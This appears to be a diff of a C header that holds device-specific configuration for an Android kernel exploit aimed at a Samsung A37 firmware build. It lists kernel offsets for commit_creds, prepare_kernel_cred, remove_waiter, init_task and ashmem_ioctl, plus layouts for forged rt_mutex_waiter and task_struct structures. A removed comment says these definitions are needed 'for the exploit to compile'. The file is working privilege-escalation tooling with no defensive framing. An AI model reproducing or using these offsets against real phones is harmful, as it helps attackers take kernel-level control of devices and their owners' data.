@@ -16,14 +16,6 @@
   "samsung/a37xnaxx/a37x:16/BP4A.251205.006/A376BXXU1AZB7_OJM1AZB7:user/release-keys"
 #endif
 
-/* ============================================================
-   A37 KERNEL OFFSETS - Recovered from actual kernel.bin
-   remove_waiter: 0xffffffc0091097e4
-   BTF validated: rt_mutex_waiter.task = 0x30
-   BTF validated: task_struct.pi_lock = 0x924
-   BTF validated: task_struct.pi_blocked_on = 0x950
-   ============================================================ */
-
 #define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
@@ -32,16 +24,11 @@
 #define KMALLOC_CACHE_TYPES 3
 #define KMALLOC_CGROUP_TYPE 2
 
-/* A37 remove_waiter offset - function at 0x11097e4 */
 #define SLIDE_FAKE_WAITER_PRIO 0
 #define SLIDE_WAITER_WAKE_STATE 0
 #define SLIDE_LOCK_OWNER_VALUE 1ULL
 #define SLIDE_USE_FAKE_TASK 1
-
-/* Trace event ID - must be verified on running device */
 #define SLIDE_TRACEFS_EVENT_ID 106
-
-/* Worker caller offset - from worker_thread disassembly */
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000dbd9cULL
 #define SLIDE_PSELECT_WORD_SHIFT 0
 
@@ -90,10 +77,23 @@
 #define DIRECT_MAP_END 0xffffff9000000000ULL
 #define VMEMMAP_START 0xfffffffe00000000ULL
 
-/* A37 FUNCTION OFFSETS - From vmlinux.elf */
-#define SYSTEM_UNBOUND_WQ_OFF 0x011bf35bULL
-#define INIT_TASK_OFF 0x011937c3ULL
-#define ASHMEM_IOCTL_OFF 0x00d37cf8ULL
+/* ============================================================
+   A37 EXACT OFFSETS - From vmlinux.elf
+   remove_waiter: 0x11097e4
+   commit_creds: 0x0e5fcc
+   prepare_kernel_cred: 0x0e6708
+   ashmem_ioctl: 0xd271e0
+   system_unbound_wq: 0x229ae60
+   init_task: 0x22af700
+   ============================================================ */
+
+#define REMOVE_WAITER_OFF 0x11097e4ULL
+#define COMMIT_CREDS_OFF 0x0e5fccULL
+#define PREPARE_KERNEL_CRED_OFF 0x0e6708ULL
+#define ASHMEM_IOCTL_OFF 0x00d271e0ULL
+#define SYSTEM_UNBOUND_WQ_OFF 0x229ae60ULL
+#define INIT_TASK_OFF 0x22af700ULL
+
 #define ASHMEM_COMPAT_IOCTL_OFF 0x00d38630ULL
 #define ASHMEM_MMAP_OFF 0x00d38688ULL
 #define ASHMEM_OPEN_OFF 0x00d388b4ULL
@@ -115,7 +115,7 @@
 #define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x0243ef78ULL
 #define SLIDE_SYSCTL_BOOTID_OFF 0x026d1b60ULL
 
-/* A37 BTF-validated task_struct offsets */
+/* BTF-validated task_struct offsets */
 #define TASK_USAGE_OFF 0x40
 #define TASK_PRIO_OFF 0x84
 #define TASK_NORMAL_PRIO_OFF 0x8c
@@ -125,7 +125,7 @@
 #define TASK_PI_TOP_TASK_OFF 0x948
 #define TASK_PI_BLOCKED_ON_OFF 0x950
 
-/* A37 BTF-validated rt_mutex_waiter offsets */
+/* BTF-validated rt_mutex_waiter offsets */
 #define FAKE_WAITER_TREE_PRIO_OFF 0x18
 #define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
 #define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
@@ -208,7 +208,7 @@
 #define FAKE_TASK_PI_TOP_TASK_OFF TASK_PI_TOP_TASK_OFF
 #define FAKE_TASK_PI_BLOCKED_ON_OFF TASK_PI_BLOCKED_ON_OFF
 
-/* Derived definitions - these must be defined for the exploit to compile */
+/* Derived addresses */
 #define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
 #define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
 #define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
@@ -228,6 +228,9 @@
 #define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
 #define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
 #define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
+#define COMMIT_CREDS (KIMAGE_TEXT_BASE + COMMIT_CREDS_OFF)
+#define PREPARE_KERNEL_CRED (KIMAGE_TEXT_BASE + PREPARE_KERNEL_CRED_OFF)
+#define REMOVE_WAITER (KIMAGE_TEXT_BASE + REMOVE_WAITER_OFF)
 
 #define SLIDE_NFULNL_LOGGER_NAME_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
 #define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
@@ -236,13 +239,8 @@
 #define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
 #define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
 
-/* For compatibility with common.h macros */
 #define SLIDE_NFULNL_LOGGER_NAME (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
 #define SLIDE_SYSCTL_BOOTID (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
 #define VMEMMAP_END (VMEMMAP_START + ((DIRECT_MAP_END - DIRECT_MAP_BASE) >> 12) * STRUCT_PAGE_SIZE)
-#define SLIDE_PHYSICAL_SLOT_DELAYS_USEC 20000
-#define SLIDE_VIRTUAL_BASE_DELAY_USEC 25000
-#define APP_PAYLOAD_ATTEMPT_DELAYS_USEC 25000, 20000, 30000, 50000
-#define APP_FOPS_ROUTE_USE_PSELECT_DELAY 1
 
 #endif
